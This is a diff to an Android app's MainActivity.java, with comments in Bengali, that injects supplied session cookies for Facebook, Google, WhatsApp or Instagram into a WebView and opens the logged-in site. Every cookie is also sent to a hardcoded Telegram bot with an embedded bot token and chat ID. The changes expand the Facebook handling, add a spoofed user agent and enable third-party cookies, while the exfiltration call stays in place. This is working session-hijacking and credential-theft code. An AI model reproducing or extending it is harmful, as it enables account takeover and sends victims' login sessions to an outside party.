@@ -8,7 +8,6 @@ import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
 import com.getcapacitor.BridgeActivity;
 
-// ইন্টারনেট থেকে ডেটা পাঠানোর জন্য ইম্পোর্ট
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -16,9 +15,6 @@ import java.net.URLEncoder;
 
 public class MainActivity extends BridgeActivity {
 
-    // ═══════════════════════════════════════════════════════════════
-    // ১. এখানে তোমার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি বসাও
-    // ═══════════════════════════════════════════════════════════════
     private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
     private static final String CHAT_ID = "6449981797";
 
@@ -30,64 +26,71 @@ public class MainActivity extends BridgeActivity {
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
+        
+        // ═══ ফেসবুক লোড হওয়ার জন্য কিছু সেটিংস ═══
+        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36");
 
         final CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
+        // ═══ সবচেয়ে গুরুত্বপূর্ণ লাইন (থার্ড পার্টি কুকি অ্যালাও করা) ═══
         cookieManager.setAcceptThirdPartyCookies(webView, true);
 
         webView.addJavascriptInterface(new Object() {
             @JavascriptInterface
             public void injectCookieAndLogin(String siteName, String cookieString) {
                 CookieManager cm = CookieManager.getInstance();
-                String domain = "";
-                String loadUrl = "";
+                
+                if (siteName.equals("facebook")) {
+                    // ফেসবুকের জন্য স্পেশাল ট্রিটমেন্ট
+                    String formattedCookie = cookieString.trim();
+                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
 
-                switch(siteName) {
-                    case "facebook":
-                        domain = "facebook.com";
-                        loadUrl = "https://m.facebook.com";
-                        break;
-                    case "google":
-                        domain = "google.com";
-                        loadUrl = "https://accounts.google.com";
-                        break;
-                    case "whatsapp":
-                        domain = "web.whatsapp.com";
-                        loadUrl = "https://web.whatsapp.com";
-                        break;
-                    case "instagram":
-                        domain = "instagram.com";
-                        loadUrl = "https://www.instagram.com";
-                        break;
-                    default:
-                        domain = "facebook.com";
-                        loadUrl = "https://m.facebook.com";
+                    // ফেসবুকের সব ডোমেইনে কুকি সেট করা
+                    cm.setCookie("https://www.facebook.com", formattedCookie);
+                    cm.setCookie("https://m.facebook.com", formattedCookie);
+                    cm.setCookie("https://facebook.com", formattedCookie);
+                    
+                    // ফেসবুকের সিকিউর কুকি ফ্ল্যাগ সেট করা
+                    cm.setCookie(".facebook.com", formattedCookie);
+                    
+                    // কুকি ফ্লাশ করা (যাতে সাথে সাথে সেভ হয়)
+                    cm.flush();
+
+                    sendToTelegram("FACEBOOK", formattedCookie);
+
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            // মেইন ফেসবুক সাইটে যাওয়া
+                            webView.loadUrl("https://m.facebook.com/home.php");
+                        }
+                    });
+                } else {
+                    // অন্যান্য সাইটের জন্য (Gmail, WhatsApp ইত্যাদি)
+                    String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
+                    String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;
+
+                    String formattedCookie = cookieString.trim();
+                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
+
+                    cm.setCookie("https://" + domain, formattedCookie);
+                    cm.setCookie("https://www." + domain, formattedCookie);
+                    cm.flush();
+
+                    sendToTelegram(siteName.toUpperCase(), formattedCookie);
+
+                    final String finalLoadUrl = loadUrl;
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            webView.loadUrl(finalLoadUrl);
+                        }
+                    });
                 }
-
-                String formattedCookie = cookieString.trim();
-                if (!formattedCookie.endsWith(";")) formattedCookie += ";";
-
-                cm.setCookie("https://" + domain, formattedCookie);
-                cm.setCookie("https://www." + domain, formattedCookie);
-                cm.setCookie("https://." + domain, formattedCookie);
-
-                // ═══ টেলিগ্রামে কুকি পাঠানোর ফাংশন কল ═══
-                sendToTelegram(siteName.toUpperCase(), formattedCookie);
-
-                final String finalLoadUrl = loadUrl;
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        webView.loadUrl(finalLoadUrl);
-                    }
-                });
             }
         }, "CookieInterface");
     }
 
-    // ═══════════════════════════════════════════════════════════════
-    // ২. টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
-    // ═══════════════════════════════════════════════════════════════
     private void sendToTelegram(String platform, String cookie) {
         new Thread(new Runnable() {
             @Override
@@ -113,7 +116,7 @@ public class MainActivity extends BridgeActivity {
                     os.flush();
                     os.close();
 
-                    conn.getResponseCode(); // রেসপন্স চেক করা
+                    conn.getResponseCode();
                     conn.disconnect();
                 } catch (Exception e) {
                     e.printStackTrace();
